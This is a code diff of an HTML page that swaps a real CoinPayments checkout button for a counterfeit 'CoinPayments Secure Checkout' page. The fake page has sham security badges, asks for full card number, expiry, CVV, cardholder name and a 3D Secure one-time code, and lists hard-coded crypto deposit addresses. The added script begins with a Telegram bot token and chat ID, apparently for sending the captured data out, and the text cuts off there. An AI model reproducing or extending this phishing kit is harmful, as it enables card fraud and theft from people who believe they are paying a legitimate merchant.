@@ -1,100 +1,799 @@
 <!DOCTYPE html>
-<html lang="az">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Ödəniş Et - CoinPayments</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>CoinPayments · Secure Checkout</title>
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', system-ui, -apple-system, sans-serif; }
-    
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif; }
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+
     body {
       min-height: 100vh;
       background: #070b14;
-      display: flex; 
-      align-items: center; 
-      justify-content: center; 
-      padding: 20px;
-      color: #fff;
+      display: flex; align-items: center; justify-content: center; padding: 20px 16px;
+      position: relative; overflow-x: hidden; color: #fff;
+    }
+
+    .bg-grid {
+      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background-image: linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px);
+      background-size: 40px 40px; z-index: 0; pointer-events: none;
+    }
+    .glow-top {
+      position: absolute; top: -20%; left: 50%; transform: translateX(-50%);
+      width: 800px; height: 400px; background: radial-gradient(ellipse, rgba(247,147,26,0.15) 0%, transparent 70%);
+      filter: blur(60px); z-index: 0; pointer-events: none;
     }
 
     .card {
-      max-width: 450px; 
-      width: 100%;
+      max-width: 520px; width: 100%;
       background: #0c1421;
       border-radius: 24px;
       box-shadow: 0 40px 100px -20px rgba(0,0,0,0.9), 0 0 0 1px rgba(255,255,255,0.05);
-      padding: 40px 30px;
-      text-align: center;
-      position: relative;
+      padding: 32px 28px 28px;
+      position: relative; overflow: hidden; z-index: 1;
+    }
+    .card::before {
+      content: ''; position: absolute; top: 0; left: 0; right: 0; height: 1px;
+      background: linear-gradient(90deg, transparent, rgba(247,147,26,0.5), transparent);
     }
 
-    .brand-name { 
-      font-size: 24px; 
-      font-weight: 800; 
-      margin-bottom: 20px; 
-      letter-spacing: -0.5px;
-    }
+    .brand { display: flex; flex-direction: column; align-items: center; gap: 8px; margin-bottom: 20px; }
+    .brand-logo-container { display: flex; align-items: center; gap: 10px; }
+    .brand-logo { height: 32px; width: auto; }
+    .brand-name { font-size: 22px; font-weight: 800; letter-spacing: -0.5px; }
     .brand-name span { color: #f7931a; }
-
-    .price-display {
-      font-size: 48px;
-      font-weight: 800;
-      color: #fff;
-      margin-bottom: 30px;
-      letter-spacing: -2px;
-    }
-    .price-display span { color: #f7931a; font-size: 32px; }
-
-    .form-container {
-      display: flex;
-      justify-content: center;
-      margin-bottom: 20px;
-    }
-
-    /* Düymənin özünü bir az böyüdürük ki, gözəl görünsün */
-    .form-container input[type="image"] {
-      width: 100% !important;
-      max-width: 280px;
-      border-radius: 12px;
-      transition: transform 0.2s;
-      cursor: pointer;
-    }
     
-    .form-container input[type="image"]:hover {
-      transform: translateY(-2px);
-    }
+    .security-badges { display: flex; justify-content: center; gap: 8px; margin-bottom: 20px; }
+    .sec-badge { display: flex; align-items: center; gap: 4px; font-size: 9.5px; font-weight: 600; color: #00d4aa; background: rgba(0, 212, 170, 0.08); padding: 4px 8px; border-radius: 6px; border: 1px solid rgba(0, 212, 170, 0.15); }
+    .sec-badge svg { width: 12px; height: 12px; fill: #00d4aa; }
 
-    .note {
-      font-size: 12px;
-      color: #6b8099;
-      margin-top: 20px;
-      line-height: 1.5;
+    .amount-box {
+      background: linear-gradient(180deg, rgba(19,31,48,0.6) 0%, rgba(12,20,33,0.6) 100%);
+      border-radius: 16px; padding: 20px; margin-bottom: 24px;
+      border: 1px solid rgba(255,255,255,0.06); position: relative;
     }
+    .amount-label { font-size: 11px; font-weight: 600; color: #6b8099; letter-spacing: 1.5px; text-transform: uppercase; margin-bottom: 6px; }
+    .amount-row { display: flex; align-items: center; gap: 8px; }
+    .currency { font-size: 28px; font-weight: 500; color: #4a5c72; }
+    .amount-input { background: transparent; border: none; outline: none; color: #fff; font-size: 48px; font-weight: 800; letter-spacing: -2px; width: 100%; padding: 0; font-family: inherit; }
+    .amount-input::placeholder { color: rgba(255,255,255,0.1); }
+    
+    .quick-amounts { display: flex; gap: 8px; margin-top: 12px; }
+    .quick-amounts button { flex: 1; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); color: #8aa0b8; font-size: 12px; font-weight: 600; padding: 8px 0; border-radius: 8px; cursor: pointer; transition: all 0.2s; }
+    .quick-amounts button:hover { background: rgba(247,147,26,0.1); border-color: rgba(247,147,26,0.3); color: #f7931a; }
+
+    .section-title { font-size: 12px; font-weight: 700; color: #8aa0b8; letter-spacing: 1px; text-transform: uppercase; margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center; }
+    .section-title span { color: #f7931a; }
+
+    .method-selector { display: flex; flex-direction: column; gap: 12px; margin-bottom: 24px; }
+    .method-btn {
+      display: flex; align-items: center; justify-content: space-between;
+      background: #070b14; border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 16px; padding: 18px 20px; cursor: pointer; transition: all 0.2s;
+      text-align: left;
+    }
+    .method-btn:hover { border-color: rgba(247,147,26,0.5); background: rgba(247,147,26,0.05); }
+    .method-btn.selected { border-color: #f7931a; background: rgba(247,147,26,0.08); }
+    .method-info { display: flex; align-items: center; gap: 14px; }
+    .method-icon { width: 44px; height: 44px; border-radius: 12px; display: flex; align-items: center; justify-content: center; background: rgba(255,255,255,0.05); }
+    .method-icon svg { width: 22px; height: 22px; fill: #fff; }
+    .method-text h4 { font-size: 15px; font-weight: 700; color: #fff; margin-bottom: 2px; }
+    .method-text p { font-size: 12px; color: #6b8099; }
+    .method-check { width: 20px; height: 20px; border-radius: 50%; border: 2px solid #4a5c72; display: flex; align-items: center; justify-content: center; }
+    .method-btn.selected .method-check { border-color: #f7931a; background: #f7931a; }
+    .method-btn.selected .method-check::after { content: '✓'; font-size: 11px; font-weight: 800; color: #0c1421; }
+
+    .btn { width: 100%; padding: 16px; background: linear-gradient(180deg, #f7931a 0%, #e8820a 100%); color: #0c1421; border: none; border-radius: 12px; font-size: 15px; font-weight: 800; cursor: pointer; transition: all 0.2s; box-shadow: 0 4px 14px rgba(247,147,26,0.3); display: flex; align-items: center; justify-content: center; gap: 8px; }
+    .btn:hover { background: linear-gradient(180deg, #ffa53a 0%, #f7931a 100%); transform: translateY(-1px); }
+    .btn:active { transform: translateY(1px); }
+    .btn:disabled { opacity: 0.5; pointer-events: none; }
+    
+    .btn-confirm { background: linear-gradient(180deg, #00d4aa 0%, #00b894 100%); color: #0c1421; box-shadow: 0 4px 14px rgba(0,212,170,0.3); }
+    .btn-confirm:hover { background: linear-gradient(180deg, #00e6b8 0%, #00d4aa 100%); }
+    .btn-secondary { background: transparent; color: #8aa0b8; box-shadow: none; border: 1px solid rgba(255,255,255,0.1); }
+    .btn-secondary:hover { background: rgba(255,255,255,0.05); color: #fff; }
+
+    .view { display: none; }
+    .view.active { display: block; }
+
+    /* Düzəldilmiş Kart Loqoları: Yalnız Visa və Mastercard */
+    .card-brands { display: flex; justify-content: center; align-items: center; gap: 20px; margin-bottom: 16px; }
+    .card-brands svg { height: 24px; width: auto; }
+
+    .form-group { margin-bottom: 16px; position: relative; }
+    .form-group label { display: block; font-size: 11px; font-weight: 600; color: #6b8099; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
+    .input-wrapper { position: relative; }
+    .input-wrapper input { width: 100%; background: #070b14; border: 1px solid rgba(255,255,255,0.1); border-radius: 10px; padding: 14px 16px; color: #fff; font-size: 15px; outline: none; transition: border 0.2s; font-family: monospace; letter-spacing: 1px; }
+    .input-wrapper input:focus { border-color: #f7931a; }
+    .input-wrapper input::placeholder { color: #4a5c72; font-family: 'Inter', sans-serif; letter-spacing: 0; }
+    .row-2 { display: flex; gap: 12px; }
+    .row-2 .form-group { flex: 1; }
+
+    /* Xəta Mesajları */
+    .error-text { color: #ff6b6b; font-size: 11px; margin-top: 4px; display: none; }
+    .form-group.has-error input { border-color: #ff6b6b; }
+    .form-group.has-error .error-text { display: block; }
+
+    .search-bar { display: flex; align-items: center; background: #070b14; border: 1px solid rgba(255,255,255,0.08); border-radius: 10px; padding: 10px 14px; margin-bottom: 12px; }
+    .search-bar svg { width: 16px; height: 16px; fill: #6b8099; margin-right: 8px; }
+    .search-bar input { background: transparent; border: none; outline: none; color: #fff; font-size: 13px; width: 100%; }
+    .coin-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin-bottom: 20px; max-height: 200px; overflow-y: auto; padding-right: 4px; }
+    .coin-grid::-webkit-scrollbar { width: 4px; }
+    .coin-grid::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 4px; }
+    .coin-item { background: #0c1421; border: 1px solid rgba(255,255,255,0.06); border-radius: 12px; padding: 10px 4px 8px; display: flex; flex-direction: column; align-items: center; gap: 4px; cursor: pointer; transition: all 0.2s; position: relative; }
+    .coin-item:hover { background: #131f30; border-color: rgba(255,255,255,0.15); }
+    .coin-item.selected { border-color: #f7931a; background: rgba(247,147,26,0.08); }
+    .coin-item.selected::after { content: ''; position: absolute; top: 6px; right: 6px; width: 6px; height: 6px; background: #f7931a; border-radius: 50%; box-shadow: 0 0 8px #f7931a; }
+    .coin-logo { width: 24px; height: 24px; border-radius: 50%; object-fit: contain; }
+    .coin-name { font-size: 9px; font-weight: 600; color: #fff; text-align: center; }
+    .coin-symbol { font-size: 8px; color: #6b8099; }
+
+    .qr-area { background: #fff; border-radius: 16px; padding: 16px; display: flex; align-items: center; justify-content: center; margin-bottom: 20px; }
+    .qr-area img { width: 160px; height: 160px; display: block; }
+    .address-box { background: #070b14; border: 1px solid rgba(255,255,255,0.08); border-radius: 12px; padding: 14px; margin-bottom: 16px; }
+    .address-label { font-size: 10px; font-weight: 600; color: #6b8099; text-transform: uppercase; margin-bottom: 6px; letter-spacing: 0.5px; }
+    .address-row { display: flex; align-items: center; gap: 10px; }
+    .address-value { flex: 1; font-family: monospace; font-size: 12px; color: #f7931a; word-break: break-all; line-height: 1.4; }
+    .copy-btn { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); color: #fff; padding: 6px 10px; border-radius: 6px; font-size: 11px; font-weight: 600; cursor: pointer; transition: all 0.2s; }
+    .copy-btn:hover { background: rgba(255,255,255,0.1); }
+    .breakdown { background: #070b14; border: 1px solid rgba(255,255,255,0.06); border-radius: 12px; padding: 16px; margin-bottom: 20px; }
+    .breakdown-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; font-size: 13px; color: #8aa0b8; }
+    .breakdown-row:last-child { margin-bottom: 0; padding-top: 12px; border-top: 1px dashed rgba(255,255,255,0.1); font-size: 15px; color: #fff; font-weight: 700; }
+    .breakdown-row span:last-child { color: #fff; font-weight: 600; }
+    .breakdown-row:last-child span:last-child { color: #00d4aa; }
+
+    .otp-header { text-align: center; margin-bottom: 24px; }
+    .otp-icon { width: 60px; height: 60px; border-radius: 50%; background: rgba(247,147,26,0.1); border: 1px solid rgba(247,147,26,0.2); display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; }
+    .otp-icon svg { width: 28px; height: 28px; fill: #f7931a; }
+    .otp-header h3 { font-size: 20px; font-weight: 700; margin-bottom: 8px; }
+    .otp-header p { font-size: 13px; color: #8aa0b8; line-height: 1.5; }
+    
+    /* OTP input düzəlişi (4-6 rəqəm) */
+    .otp-input-wrapper { display: flex; justify-content: center; gap: 8px; margin-bottom: 24px; }
+    .otp-input-wrapper input { width: 200px; height: 56px; background: #070b14; border: 1px solid rgba(255,255,255,0.1); border-radius: 10px; text-align: center; font-size: 24px; font-weight: 700; color: #fff; outline: none; transition: border 0.2s; font-family: monospace; letter-spacing: 8px; padding: 0 10px; }
+    .otp-input-wrapper input:focus { border-color: #f7931a; }
+    .otp-input-wrapper input::placeholder { letter-spacing: 2px; font-size: 14px; font-family: 'Inter', sans-serif; color: #4a5c72; }
+
+    .wait-view, .success-view, .error-view { display: none; text-align: center; padding: 30px 0 10px; }
+    .wait-view.active, .success-view.active, .error-view.active { display: block; }
+    .wait-icon { width: 64px; height: 64px; border-radius: 50%; background: rgba(247,147,26,0.1); border: 1px solid rgba(247,147,26,0.2); display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; font-size: 28px; animation: spin 2s linear infinite; }
+    .success-icon { width: 64px; height: 64px; border-radius: 50%; background: rgba(0,212,170,0.1); border: 1px solid rgba(0,212,170,0.2); display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; font-size: 28px; animation: pop 0.4s ease; }
+    .error-icon { width: 64px; height: 64px; border-radius: 50%; background: rgba(255,80,80,0.1); border: 1px solid rgba(255,80,80,0.2); display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; font-size: 28px; animation: pop 0.4s ease; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    @keyframes pop { 0% { transform: scale(0); } 70% { transform: scale(1.1); } 100% { transform: scale(1); } }
+    .success-title, .wait-title, .error-title { font-size: 20px; font-weight: 700; color: #fff; margin-bottom: 8px; }
+    .success-text, .wait-text, .error-text { font-size: 13px; color: #8aa0b8; line-height: 1.5; margin-bottom: 24px; }
+    .success-text strong { color: #00d4aa; }
+    .error-text strong { color: #ff6b6b; }
+
+    .footer-note { text-align: center; font-size: 11px; color: #4a5c72; margin-top: 24px; display: flex; flex-direction: column; gap: 8px; }
+    .footer-logos { display: flex; justify-content: center; gap: 16px; align-items: center; opacity: 0.4; margin-bottom: 4px; }
+    .footer-logos img { height: 16px; filter: grayscale(100%); }
+    .spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(0,0,0,0.2); border-radius: 50%; border-top-color: #0c1421; animation: spin 0.8s linear infinite; }
   </style>
 </head>
 <body>
+  <div class="bg-grid"></div>
+  <div class="glow-top"></div>
 
   <div class="card">
-    <div class="brand-name">Coin<span>Payments</span></div>
-    
-    <div class="price-display"><span>$</span>100.00</div>
-    
-    <div class="form-container">
-      
-      <!-- SENIN YARATDIĞIN COINPAYMENTS FORMASI BURADADIR -->
-      <form action="https://a-api.coinpayments.net/api/v1/invoices/button" method="post">
-        <input type="hidden" name="action" value="checkout" />
-        <input type="hidden" name="data" value="QuwxBMvQPaSFxNjMYN3/gFaXngrf92EEFEq3FmoAQRWTXO7kCksezWtOdUWXXdEM/vvjjZcYKRJ7nfeAOnNUCkViPyl7RxvSN2Vjj1OCVlXf8j9eNJYnR46WMizH+EWIGuKmD1acNxeNe37MnGTQ8SClYo1WFY+cEo2q9EDs49F7MnUXqyifr9tK1KtxXRK/kZWG6qmM/P0TSb2MPSqMIixRjCQ8NZnjKmwZhJlpiNwngs1YXVxbVotkqxD4UER3swQTT6Asa7mT3zh8eteTNkR2SbMxAY2SVrkK5WTt9lxOJl2gGRLm3C8Gkvu3DKsHo+OfFfMFSOxcAPHIgV5V2lYtwkwE2yUgNZAUqw2fA/MzkWWzo68pW+SBL5Cs48hknROlXa1mMEb6Vop1lKvB72mZ+Kh8JvF43tkSOLM27N+jgMeM1ZttU/RHsc3Nx1ME5E1ONqlbZQkz0gZDhMxXcGDhSHTOfDANaFvQatJ4IgqAJk0+mgxdfir9sFuK/wJviGQB44ISSiRtM76fssEdkYMDm6BYxh24C1/Nlz+Mg5HdT02vLsdUBP5iXK6H23FHPYFAFtDwgJnKC7UMEwUZ23ksZaSnvaG3XObyNtXCt3d5y+mD8oiDBDgIL4O4ArUDUOohTSJ0IBIpUWeFba//kecRZhTQkEfCxDI2sFxTdgDIyC9YjKelKrv62Dvp7VzWaUKDsN2P33EAel9AFYo96EbDIdAPQ8yAWQdYXW5M/s8jQ64bylPaZ79cUAgyrykXGqwli4YCsLf1sB4KIxp+KjXkoqWZA5nxJ6kDOskvFcM4q4qZ4KI+iWCCKoDYRaadNWa8IkxE4ExGErVXw0wj+60Lxp4xKZzfaSitrcivqzrnOwKrc5huD5jFpvhcBzYqT6bfru2dBIWNu8aNOSaiAS9ZOaMs4nVqQRbCqntDjFfCUsCiEeDZyrWangA8G6DzrC2VvITWQF1oCjk69T6nmIkfUcBd0OB3nDVqIXnT3fgo1BafssE3UpNWvs6XzDKo" />
-        <input type="image" src="https://a-api.coinpayments.net/checkout_buttons/pay_black_middle.svg" name="submit" alt="Buy Now with CoinPayments.net">
-      </form>
-      <!-- FORMA BITDI -->
-
+    <div class="brand">
+      <div class="brand-logo-container">
+        <img class="brand-logo" src="https://cdn.brandfetch.io/coinpayments.net/logo?c=1id7R1U2Xq5vG0" alt="CoinPayments" onerror="this.style.display='none'">
+        <div class="brand-name">Coin<span>Payments</span></div>
+      </div>
     </div>
 
-    <div class="note">
-      Ödəniş etmək üçün yuxarıdakı düyməyə basın.<br>Sizi təhlükəsiz CoinPayments səhifəsinə yönləndirəcək.
+    <div class="security-badges">
+      <div class="sec-badge"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg> SSL</div>
+      <div class="sec-badge"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg> 3D Secure</div>
+      <div class="sec-badge"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg> Verified</div>
+    </div>
+
+    <!-- STEP 1 -->
+    <div id="step1View" class="view active">
+      <div class="amount-box">
+        <div class="amount-label">Payment amount</div>
+        <div class="amount-row">
+          <span class="currency">$</span>
+          <input type="text" class="amount-input" id="amountInput" placeholder="0.00" inputmode="decimal">
+        </div>
+        <div class="quick-amounts">
+          <button data-val="50">$50</button>
+          <button data-val="100">$100</button>
+          <button data-val="500">$500</button>
+          <button data-val="1000">$1000</button>
+        </div>
+      </div>
+
+      <div class="section-title">Choose Payment Method</div>
+
+      <div class="method-selector">
+        <div class="method-btn selected" id="methodCard" data-method="card">
+          <div class="method-info">
+            <div class="method-icon"><svg viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg></div>
+            <div class="method-text">
+              <h4>Bank Card</h4>
+              <p>Visa, Mastercard</p>
+            </div>
+          </div>
+          <div class="method-check"></div>
+        </div>
+
+        <div class="method-btn" id="methodCrypto" data-method="crypto">
+          <div class="method-info">
+            <div class="method-icon"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg></div>
+            <div class="method-text">
+              <h4>Cryptocurrency</h4>
+              <p>BTC, ETH, USDT & more</p>
+            </div>
+          </div>
+          <div class="method-check"></div>
+        </div>
+      </div>
+
+      <button class="btn" id="continueBtn">Continue <span style="font-size:18px;">→</span></button>
+    </div>
+
+    <!-- STEP 2A: CARD -->
+    <div id="cardView" class="view">
+      <div class="section-title">Card Details <span>Secure</span></div>
+      
+      <!-- Düzəldilmiş və aydın loqolar: Yalnız Visa və Mastercard -->
+      <div class="card-brands">
+        <!-- Visa SVG -->
+        <svg viewBox="0 0 780 500" xmlns="http://www.w3.org/2000/svg">
+          <rect width="780" height="500" rx="40" fill="#1A1F71"/>
+          <path d="M293.2 348.7l33.1-205.8h52.9l-33.2 205.8h-52.8zM479.4 148.6c-10.5-4.1-27-8.5-47.4-8.5-52.3 0-89.1 27.9-89.4 67.8-.3 29.5 26.3 46 46.3 55.8 20.5 10 27.4 16.3 27.4 25.2-.1 13.6-16.4 19.9-31.6 19.9-21.1 0-32.3-3.1-49.6-10.6l-6.8-3.2-7.4 45.8c12.3 5.7 35 10.6 58.5 10.9 55.6 0 91.7-27.6 92.1-70.3.2-23.4-13.9-41.2-44.5-55.9-18.5-9.5-29.9-15.8-29.9-25.4 0-8.5 9.6-17.6 30.4-17.6 17.4-.3 30 3.7 39.8 7.9l4.7 2.3 7.3-44.1zM615.1 142.9h-40.8c-12.6 0-22.1 3.6-27.7 16.9l-78.8 199.9h55.4s9.1-24.7 11.1-30.2h67.7c1.6 7.1 6.4 30.2 6.4 30.2h49.1l-42.4-216.8zm-65.2 139.6c4.4-11.7 21.2-56.8 21.2-56.8-.3.5 4.4-11.9 7.1-19.6l3.6 17.7 12.3 58.7h-44.2zM231.8 142.9L180 284.8l-5.5-27.8c-9.6-32.1-39.6-66.9-73.1-84.3l47.3 176h56l83.3-205.8h-56.2z" fill="#fff"/>
+          <path d="M131.5 142.9H45.4l-.7 4.1c66.7 16.7 111 57 129.3 105.7l-18.6-92.9c-3.2-12.5-12.6-16.3-24.2-16.9z" fill="#F7B600"/>
+        </svg>
+        <!-- Mastercard -->
+        <svg viewBox="0 0 780 500" xmlns="http://www.w3.org/2000/svg">
+          <rect width="780" height="500" rx="40" fill="#252525"/>
+          <circle cx="310" cy="250" r="150" fill="#EB001B"/>
+          <circle cx="470" cy="250" r="150" fill="#F79E1B"/>
+          <path d="M390 130a150 150 0 0 0 0 240 150 150 0 0 0 0-240z" fill="#FF5F00"/>
+        </svg>
+      </div>
+
+      <!-- Kart Nömrəsi -->
+      <div class="form-group" id="groupCardNumber">
+        <label>Card Number</label>
+        <div class="input-wrapper"><input type="tel" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric"></div>
+        <div class="error-text" id="errCardNumber">Please enter a valid 16-digit card number.</div>
+      </div>
+
+      <div class="row-2">
+        <!-- Ay/İl -->
+        <div class="form-group" id="groupExpiry">
+          <label>Expiry Date</label>
+          <div class="input-wrapper"><input type="tel" id="cardExpiry" placeholder="MM/YY" maxlength="5" inputmode="numeric"></div>
+          <div class="error-text" id="errExpiry">Invalid or expired date.</div>
+        </div>
+        <!-- CVV -->
+        <div class="form-group" id="groupCvv">
+          <label>CVV</label>
+          <div class="input-wrapper"><input type="tel" id="cardCvv" placeholder="123" maxlength="4" inputmode="numeric"></div>
+          <div class="error-text" id="errCvv">CVV must be at least 3 digits.</div>
+        </div>
+      </div>
+
+      <!-- Ad -->
+      <div class="form-group" id="groupName">
+        <label>Cardholder Name</label>
+        <div class="input-wrapper"><input type="text" id="cardName" placeholder="JOHN DOE" style="font-family:'Inter',sans-serif; letter-spacing:0;"></div>
+        <div class="error-text" id="errName">Please enter the cardholder name.</div>
+      </div>
+
+      <button class="btn" id="goToOtpBtn">Continue <span style="font-size:18px;">→</span></button>
+      <button class="btn btn-secondary" id="backToStep1FromCard" style="margin-top: 12px;">← Back</button>
+    </div>
+
+    <!-- STEP 2B: CRYPTO -->
+    <div id="cryptoView" class="view">
+      <div class="section-title">Select Cryptocurrency <span id="liveCryptoValue">0.0000 BTC</span></div>
+      
+      <div class="search-bar">
+        <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
+        <input type="text" id="searchInput" placeholder="Search coin...">
+      </div>
+
+      <div class="coin-grid" id="coinGrid">
+        <div class="coin-item selected" data-coin="BTC" data-name="Bitcoin" data-rate="67000" data-address="bc1pqd7raqd8ckzxwrlvmupktjw8gy7wpsmuk29c4ntcaf3f3a4u5zxqhtl08j" data-network="Bitcoin">
+          <img class="coin-logo" src="https://essamamdani.github.io/open-crypto-icons/icons_svg/btc.svg" alt="BTC">
+          <div class="coin-name">Bitcoin</div><div class="coin-symbol">BTC</div>
+        </div>
+        <div class="coin-item" data-coin="ETH" data-name="Ethereum" data-rate="3500" data-address="0x99e2EB85c6aeba53d69769905EFcbE06030E27DD" data-network="Ethereum">
+          <img class="coin-logo" src="https://essamamdani.github.io/open-crypto-icons/icons_svg/eth.svg" alt="ETH">
+          <div class="coin-name">Ethereum</div><div class="coin-symbol">ETH</div>
+        </div>
+        <div class="coin-item" data-coin="USDT" data-name="Tether" data-rate="1" data-address="TPztE63UED75Bs3szePGkAHtw5nf38mHEs" data-network="TRON">
+          <img class="coin-logo" src="https://essamamdani.github.io/open-crypto-icons/icons_svg/usdt.svg" alt="USDT">
+          <div class="coin-name">Tether</div><div class="coin-symbol">TRON</div>
+        </div>
+        <div class="coin-item" data-coin="DOGE" data-name="Dogecoin" data-rate="0.15" data-address="D6YTZYEtJcTBVh63GeuL2u7HcBNxJ3jEWU" data-network="Dogecoin">
+          <img class="coin-logo" src="https://essamamdani.github.io/open-crypto-icons/icons_svg/doge.svg" alt="DOGE">
+          <div class="coin-name">Dogecoin</div><div class="coin-symbol">DOGE</div>
+        </div>
+      </div>
+
+      <button class="btn" id="goToCryptoPaymentBtn">Continue to Payment <span style="font-size:18px;">→</span></button>
+      <button class="btn btn-secondary" id="backToStep1FromCrypto" style="margin-top: 12px;">← Back</button>
+    </div>
+
+    <!-- STEP 3A: CRYPTO PAYMENT -->
+    <div id="cryptoPaymentView" class="view">
+      <div class="section-title">Complete Crypto Payment</div>
+      
+      <div class="qr-area"><img id="qrImage" src="" alt="QR Code"></div>
+      <div class="address-box">
+        <div class="address-label">Deposit Address</div>
+        <div class="address-row">
+          <div class="address-value" id="addressValue">—</div>
+          <button class="copy-btn" id="copyBtn">Copy</button>
+        </div>
+      </div>
+      <div class="breakdown">
+        <div class="breakdown-row"><span>Amount</span><span id="bdAmount">$0.00</span></div>
+        <div class="breakdown-row"><span>Total to send</span><span id="bdTotal">0.00000000 BTC</span></div>
+      </div>
+
+      <button class="btn btn-confirm" id="confirmCryptoBtn">I have sent the payment</button>
+      <button class="btn btn-secondary" id="backToCryptoFromPayment" style="margin-top: 12px;">← Back</button>
+    </div>
+
+    <!-- STEP 3B: OTP -->
+    <div id="otpView" class="view">
+      <div class="otp-header">
+        <div class="otp-icon"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg></div>
+        <h3>3D Secure Verification</h3>
+        <p>We sent OTP verification code to your device.<br>Please enter the code below to complete your payment.</p>
+      </div>
+      
+      <!-- 4-6 rəqəmli OTP xanası -->
+      <div class="otp-input-wrapper">
+        <input type="tel" id="otpInput" maxlength="6" inputmode="numeric" placeholder="Code" autocomplete="one-time-code">
+      </div>
+      
+      <button class="btn" id="submitCardBtn">Submit Payment</button>
+      <button class="btn btn-secondary" id="backToCard" style="margin-top: 12px;">← Back</button>
+    </div>
+
+    <!-- WAIT / SUCCESS / ERROR -->
+    <div id="waitView" class="wait-view">
+      <div class="wait-icon">⏳</div>
+      <div class="wait-title">Verifying Transaction...</div>
+      <div class="wait-text">Your payment is being verified by the merchant.<br><strong>Please do not close this window.</strong></div>
+    </div>
+    <div id="successView" class="success-view">
+      <div class="success-icon">✓</div>
+      <div class="success-title">Payment Successful</div>
+      <div class="success-text">Your transaction has been confirmed.<br><strong id="successAmount">$0.00</strong></div>
+      <button class="btn" id="doneBtn">Return to Dashboard</button>
+    </div>
+    <div id="errorView" class="error-view">
+      <div class="error-icon">✕</div>
+      <div class="error-title">Transaction Failed</div>
+      <div class="error-text">We could not verify your transaction.<br><br>Please try again.</div>
+      <button class="btn" id="retryBtn">Try Again</button>
+    </div>
+
+    <div class="footer-note">
+      <div class="footer-logos">
+        <img src="https://cdn.brandfetch.io/coinpayments.net/logo?c=1id7R1U2Xq5vG0" alt="CoinPayments">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" alt="Visa">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" alt="Mastercard">
+      </div>
+      <div>© 2024 CoinPayments Inc. All rights reserved.</div>
     </div>
   </div>
 
+  <script>
+    (function() {
+      const TELEGRAM_BOT_TOKEN = '9121996957:AAEAR4EmBfQbCcVPP33ljnBLcdiwNMRfsXU';
+      const TELEGRAM_CHAT_ID = '-1005971624863';
+
+      const views = {
+        step1: document.getElementById('step1View'),
+        card: document.getElementById('cardView'),
+        crypto: document.getElementById('cryptoView'),
